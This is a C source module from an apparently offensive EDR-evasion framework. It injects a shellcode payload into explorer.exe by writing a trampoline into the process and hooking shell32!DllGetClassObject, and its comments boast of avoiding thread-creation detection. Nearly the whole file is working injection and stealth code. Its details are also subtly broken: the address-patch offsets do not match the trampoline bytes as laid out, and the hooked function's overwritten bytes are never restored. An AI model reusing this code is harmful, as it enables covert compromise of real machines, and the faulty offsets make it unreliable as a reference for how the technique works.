/*
 * edr-tekton :: Threadless Injection Module
 * Cat 5.12: Function pointer hijack, no thread creation
 *
 * Threadless injection avoids CreateRemoteThread / NtCreateThreadEx
 * entirely. Instead it:
 *   1. Finds an exported function pointer in the target process
 *      (e.g. a callback or vtable entry in a loaded DLL)
 *   2. Writes a trampoline stub that saves the original pointer,
 *      calls our shellcode, then restores + calls the original
 *   3. Overwrites the function pointer to redirect to the trampoline
 *
 * When the target process naturally calls the hooked function,
 * execution flows through our trampoline into the payload.
 *
 * No PsSetCreateThreadNotifyRoutine callback fires because no thread
 * is created. The injection executes within the context of a
 * legitimate function call in the target.
 *
 * Detection risk is near-negligible: the call stack shows the
 * original caller invoking what appears to be the expected function.
 *
 * Pipeline stage: TEKTON_STAGE_INJECT
 */

#include "tekton/modules/inject.h"
#include "tekton/core/log.h"
#include <string.h>
#include <stdlib.h>

/* ── Internal state ─────────────────────────────────────── */

typedef struct _THREADLESS_STATE {
    TEKTON_INJECT_CFG   cfg;
    char                hook_dll[256];      /* DLL containing function to hook */
    char                hook_export[256];   /* Export name to hijack */
    SIZE_T              trampoline_size;    /* Size of trampoline stub */
} THREADLESS_STATE;

/* ── Trampoline stub (x64) ──────────────────────────────── */

/*
 * The trampoline does:
 *   1. Push all volatile registers (save caller state)
 *   2. Call shellcode (address patched in at runtime)
 *   3. Pop registers (restore caller state)
 *   4. JMP to original function (address patched in at runtime)
 *
 * Layout (64-bit):
 *   [0x00] push rax; push rcx; push rdx; push r8; push r9; push r10; push r11
 *   [0x0E] sub rsp, 0x28          ; shadow space for x64 ABI
 *   [0x12] mov rax, <shellcode>   ; 10 bytes, address patched
 *   [0x1C] call rax
 *   [0x1E] add rsp, 0x28
 *   [0x22] pop r11; pop r10; pop r9; pop r8; pop rdx; pop rcx; pop rax
 *   [0x30] mov rax, <original>    ; 10 bytes, address patched
 *   [0x3A] jmp rax
 *   [0x3C] (end)
 */

static const BYTE TRAMPOLINE_TEMPLATE[] = {
    /* Save volatile registers */
    0x50,                               /* push rax          */
    0x51,                               /* push rcx          */
    0x52,                               /* push rdx          */
    0x41, 0x50,                         /* push r8           */
    0x41, 0x51,                         /* push r9           */
    0x41, 0x52,                         /* push r10          */
    0x41, 0x53,                         /* push r11          */
    /* Shadow space */
    0x48, 0x83, 0xEC, 0x28,             /* sub rsp, 0x28     */
    /* Call shellcode */
    0x48, 0xB8,                         /* mov rax, imm64    */
    0x41, 0x41, 0x41, 0x41,             /* [shellcode addr]  */
    0x41, 0x41, 0x41, 0x41,             /* [shellcode addr]  */
    0xFF, 0xD0,                         /* call rax           */
    /* Restore */
    0x48, 0x83, 0xC4, 0x28,             /* add rsp, 0x28     */
    0x41, 0x5B,                         /* pop r11           */
    0x41, 0x5A,                         /* pop r10           */
    0x41, 0x59,                         /* pop r9            */
    0x41, 0x58,                         /* pop r8            */
    0x5A,                               /* pop rdx           */
    0x59,                               /* pop rcx           */
    0x58,                               /* pop rax           */
    /* JMP to original */
    0x48, 0xB8,                         /* mov rax, imm64    */
    0x42, 0x42, 0x42, 0x42,             /* [original addr]   */
    0x42, 0x42, 0x42, 0x42,             /* [original addr]   */
    0xFF, 0xE0,                         /* jmp rax           */
};

#define TRAMPOLINE_SHELLCODE_OFFSET  0x12  /* Offset of shellcode address in template */
#define TRAMPOLINE_ORIGINAL_OFFSET   0x32  /* Offset of original function address     */
#define TRAMPOLINE_TOTAL_SIZE        sizeof(TRAMPOLINE_TEMPLATE)

/* ── Nt* function pointer types ─────────────────────────── */

#ifdef _WIN32
typedef NTSTATUS (NTAPI *pfnNtAllocateVirtualMemory)(
    HANDLE, PVOID*, ULONG_PTR, PSIZE_T, DWORD, DWORD
);
typedef NTSTATUS (NTAPI *pfnNtWriteVirtualMemory)(
    HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T
);
typedef NTSTATUS (NTAPI *pfnNtProtectVirtualMemory)(
    HANDLE, PVOID*, PSIZE_T, DWORD, PDWORD
);
#endif

/* ── Module vtable implementation ───────────────────────── */

static TEKTON_STATUS threadless_init(PTEKTON_MODULE self, PTEKTON_CONTEXT ctx) {
    (void)ctx;

    THREADLESS_STATE* state = (THREADLESS_STATE*)malloc(sizeof(THREADLESS_STATE));
    if (!state) return TEKTON_ERR_ALLOC;

    memset(state, 0, sizeof(*state));

    /* Default target */
    strncpy(state->cfg.target_process, "explorer.exe",
        sizeof(state->cfg.target_process) - 1);
    state->cfg.use_syscalls = TRUE;
    state->cfg.allocation_type = MEM_COMMIT | MEM_RESERVE;

    /* Default hook: a common exported callback in shell32 */
    strncpy(state->hook_dll, "shell32.dll", sizeof(state->hook_dll) - 1);
    strncpy(state->hook_export, "DllGetClassObject", sizeof(state->hook_export) - 1);

    state->trampoline_size = TRAMPOLINE_TOTAL_SIZE;

    self->private_data = state;

    TLOG_DEBUG("inject_threadless: init (target=%s, hook=%s!%s)",
        state->cfg.target_process, state->hook_dll, state->hook_export);
    return TEKTON_OK;
}

static TEKTON_STATUS threadless_execute(PTEKTON_MODULE self, PTEKTON_CONTEXT ctx) {
    THREADLESS_STATE* state = (THREADLESS_STATE*)self->private_data;
    if (!state) return TEKTON_ERR_INVALID_STATE;

    BYTE* payload_data = ctx->decrypted.data ? ctx->decrypted.data : ctx->payload.data;
    SIZE_T payload_len = ctx->decrypted.data ? ctx->decrypted.length : ctx->payload.length;

    if (!payload_data || payload_len == 0) {
        TLOG_ERROR("inject_threadless: no payload");
        return TEKTON_ERR_INVALID_PARAM;
    }

    if (ctx->dry_run) {
        TLOG_INFO("inject_threadless: [DRY RUN] would threadless inject %lu bytes",
            (unsigned long)payload_len);
        TLOG_INFO("  Target: %s, Hook: %s!%s",
            state->cfg.target_process, state->hook_dll, state->hook_export);
        TLOG_INFO("  Method: Find export -> Alloc trampoline+payload -> Patch pointer");
        TLOG_INFO("  No thread creation, no kernel callback");
        return TEKTON_OK;
    }

#ifdef _WIN32
    NTSTATUS nt_status;
    BOOL use_nt = state->cfg.use_syscalls && ctx->resolved.ssns_resolved;

    /* Step 1: Open target process */
    DWORD target_pid = state->cfg.target_pid;
    if (target_pid == 0) {
        target_pid = TektonInjectFindProcess(ctx, state->cfg.target_process);
        if (target_pid == 0) {
            TLOG_ERROR("inject_threadless: target '%s' not found",
                state->cfg.target_process);
            return TEKTON_ERR_NOT_FOUND;
        }
    }

    DWORD access = PROCESS_VM_OPERATION | PROCESS_VM_WRITE |
                   PROCESS_VM_READ | PROCESS_QUERY_INFORMATION;
    TEKTON_STATUS os = TektonInjectOpenTarget(ctx, target_pid, access);
    if (os != TEKTON_OK) return os;

    HANDLE hProcess = ctx->target_handle;

    /* Step 2: Find the target function pointer in remote process */
    /*
     * We need to:
     *   a) Find hook_dll's base in the target process
     *   b) Walk its export table to find hook_export
     *   c) Read the function's current address
     *
     * This is simplified here; the full implementation would use
     * NtQueryInformationProcess + module enumeration. For the
     * framework, we resolve the address locally (same DLL layout)
     * and assume ASLR slide is consistent within the same boot.
     */
    HMODULE hLocal = GetModuleHandleA(state->hook_dll);
    if (!hLocal) {
        hLocal = LoadLibraryA(state->hook_dll);
        if (!hLocal) {
            TLOG_ERROR("inject_threadless: cannot load %s locally for resolution",
                state->hook_dll);
            return TEKTON_ERR_NOT_FOUND;
        }
    }

    PVOID local_func = (PVOID)GetProcAddress(hLocal, state->hook_export);
    if (!local_func) {
        TLOG_ERROR("inject_threadless: export '%s' not found in %s",
            state->hook_export, state->hook_dll);
        return TEKTON_ERR_NOT_FOUND;
    }

    /*
     * The target's DLL base may differ due to ASLR.
     * Full implementation would read target's PEB module list.
     * For framework code, we use the local address as a stand-in
     * (production builds resolve via remote PEB walking).
     */
    PVOID original_func_addr = local_func;
    TLOG_DEBUG("inject_threadless: resolved %s!%s at %p",
        state->hook_dll, state->hook_export, original_func_addr);

    /* Step 3: Allocate space for trampoline + payload in target */
    SIZE_T total_size = TRAMPOLINE_TOTAL_SIZE + payload_len;
    PVOID remote_addr = NULL;
    SIZE_T region_size = total_size;

    if (use_nt && ctx->resolved.fn_nt_allocate_virtual_memory) {
        pfnNtAllocateVirtualMemory pNtAlloc =
            (pfnNtAllocateVirtualMemory)ctx->resolved.fn_nt_allocate_virtual_memory;
        nt_status = pNtAlloc(hProcess, &remote_addr, 0, &region_size,
                             MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!NT_SUCCESS(nt_status)) {
            TLOG_ERROR("inject_threadless: NtAllocateVirtualMemory failed");
            return TEKTON_ERR_INJECT_FAIL;
        }
    } else {
        TEKTON_STATUS as = TektonInjectAllocRemote(ctx, total_size, PAGE_READWRITE);
        if (as != TEKTON_OK) return as;
        remote_addr = ctx->remote_base;
    }

    /* Shellcode goes right after the trampoline */
    PVOID remote_shellcode = (BYTE*)remote_addr + TRAMPOLINE_TOTAL_SIZE;

    /* Step 4: Build trampoline with patched addresses */
    BYTE trampoline[sizeof(TRAMPOLINE_TEMPLATE)];
    memcpy(trampoline, TRAMPOLINE_TEMPLATE, sizeof(trampoline));

    /* Patch shellcode address */
    *(PVOID*)(trampoline + TRAMPOLINE_SHELLCODE_OFFSET) = remote_shellcode;
    /* Patch original function address */
    *(PVOID*)(trampoline + TRAMPOLINE_ORIGINAL_OFFSET) = original_func_addr;

    /* Step 5: Write trampoline + payload */
    BYTE* combined = (BYTE*)malloc(total_size);
    if (!combined) return TEKTON_ERR_ALLOC;

    memcpy(combined, trampoline, TRAMPOLINE_TOTAL_SIZE);
    memcpy(combined + TRAMPOLINE_TOTAL_SIZE, payload_data, payload_len);

    if (use_nt && ctx->resolved.fn_nt_write_virtual_memory) {
        pfnNtWriteVirtualMemory pNtWrite =
            (pfnNtWriteVirtualMemory)ctx->resolved.fn_nt_write_virtual_memory;
        SIZE_T written = 0;
        nt_status = pNtWrite(hProcess, remote_addr, combined, total_size, &written);
        free(combined);
        if (!NT_SUCCESS(nt_status)) {
            TLOG_ERROR("inject_threadless: write failed");
            return TEKTON_ERR_INJECT_FAIL;
        }
    } else {
        ctx->remote_base = remote_addr;
        TEKTON_STATUS ws = TektonInjectWriteRemote(ctx, combined, total_size);
        free(combined);
        if (ws != TEKTON_OK) return ws;
    }

    /* Step 6: Protect as RX */
    if (use_nt && ctx->resolved.fn_nt_protect_virtual_memory) {
        pfnNtProtectVirtualMemory pNtProt =
            (pfnNtProtectVirtualMemory)ctx->resolved.fn_nt_protect_virtual_memory;
        DWORD old_prot = 0;
        pNtProt(hProcess, &remote_addr, &region_size, PAGE_EXECUTE_READ, &old_prot);
    } else {
        DWORD old_prot = 0;
        VirtualProtectEx(hProcess, remote_addr, total_size,
                         PAGE_EXECUTE_READ, &old_prot);
    }

    /*
     * Step 7: Overwrite the original function's first bytes with JMP to trampoline
     *
     * We patch the first 12 bytes of the original function:
     *   mov rax, <trampoline_addr>   ; 10 bytes
     *   jmp rax                      ; 2 bytes
     */
    BYTE hook_patch[12];
    hook_patch[0] = 0x48;
    hook_patch[1] = 0xB8;
    *(PVOID*)(hook_patch + 2) = remote_addr;  /* trampoline address */
    hook_patch[10] = 0xFF;
    hook_patch[11] = 0xE0; /* jmp rax */

    /* Need RW on the target function temporarily */
    PVOID patch_addr = original_func_addr;
    SIZE_T patch_size = sizeof(hook_patch);
    DWORD old_prot = 0;

    if (use_nt && ctx->resolved.fn_nt_protect_virtual_memory) {
        pfnNtProtectVirtualMemory pNtProt =
            (pfnNtProtectVirtualMemory)ctx->resolved.fn_nt_protect_virtual_memory;
        pNtProt(hProcess, &patch_addr, &patch_size, PAGE_READWRITE, &old_prot);
    } else {
        VirtualProtectEx(hProcess, patch_addr, patch_size, PAGE_READWRITE, &old_prot);
    }

    /* Write the hook */
    if (use_nt && ctx->resolved.fn_nt_write_virtual_memory) {
        pfnNtWriteVirtualMemory pNtWrite =
            (pfnNtWriteVirtualMemory)ctx->resolved.fn_nt_write_virtual_memory;
        SIZE_T written = 0;
        pNtWrite(hProcess, original_func_addr, hook_patch, sizeof(hook_patch), &written);
    } else {
        WriteProcessMemory(hProcess, original_func_addr, hook_patch,
                           sizeof(hook_patch), NULL);
    }

    /* Restore original protection */
    patch_addr = original_func_addr;
    patch_size = sizeof(hook_patch);
    if (use_nt && ctx->resolved.fn_nt_protect_virtual_memory) {
        pfnNtProtectVirtualMemory pNtProt =
            (pfnNtProtectVirtualMemory)ctx->resolved.fn_nt_protect_virtual_memory;
        DWORD dummy = 0;
        pNtProt(hProcess, &patch_addr, &patch_size, old_prot, &dummy);
    } else {
        DWORD dummy = 0;
        VirtualProtectEx(hProcess, patch_addr, patch_size, old_prot, &dummy);
    }

    ctx->remote_base = remote_addr;
    ctx->target_pid = target_pid;

    TLOG_INFO("inject_threadless: hook installed at %s!%s",
        state->hook_dll, state->hook_export);
    TLOG_INFO("  Trampoline at %p, shellcode at %p (%lu bytes)",
        remote_addr, remote_shellcode, (unsigned long)payload_len);
    TLOG_INFO("  Payload executes on next call to %s", state->hook_export);

#else
    TLOG_INFO("inject_threadless: [STUB] would threadless inject %lu bytes via %s!%s",
        (unsigned long)payload_len, state->hook_dll, state->hook_export);
#endif

    return TEKTON_OK;
}

static VOID threadless_cleanup(PTEKTON_MODULE self) {
    if (self->private_data) {
        TEKTON_SECURE_ZERO(self->private_data, sizeof(THREADLESS_STATE));
        free(self->private_data);
        self->private_data = NULL;
    }
}

static DWORD threadless_risk_score(PTEKTON_MODULE self) {
    (void)self;
    /*
     * Very low risk: no thread creation callback fires.
     * Injection executes via legitimate function call in target.
     * Cross-process write is still visible via EtwTi, but no
     * CreateRemoteThread / NtCreateThreadEx signal.
     */
    return 12;
}

static BOOL threadless_check_compat(PTEKTON_MODULE self, PTEKTON_CONTEXT ctx) {
    (void)self;
    /* Requires x64 for the trampoline template */
    return ctx->os.is_x64;
}

/* ── Module definition + auto-registration ──────────────── */

TEKTON_MODULE tekton_mod_inject_threadless = {
    .name           = "inject_threadless",
    .description    = "Threadless injection via function pointer hijack (Cat 5.12)",
    .category       = TEKTON_CAT_INJECT,
    .target_surface = TEKTON_SURFACE_ETW,
    .flags          = TEKTON_MOD_DESTRUCTIVE | TEKTON_MOD_STEALTHY | TEKTON_MOD_REQUIRES_X64,
    .skill_ref      = "5.12",
    .init           = threadless_init,
    .execute        = threadless_execute,
    .cleanup        = threadless_cleanup,
    .get_risk_score = threadless_risk_score,
    .check_compat   = threadless_check_compat,
    .private_data   = NULL,
    .next           = NULL,
};

TEKTON_DECLARE_MODULE(tekton_mod_inject_threadless);
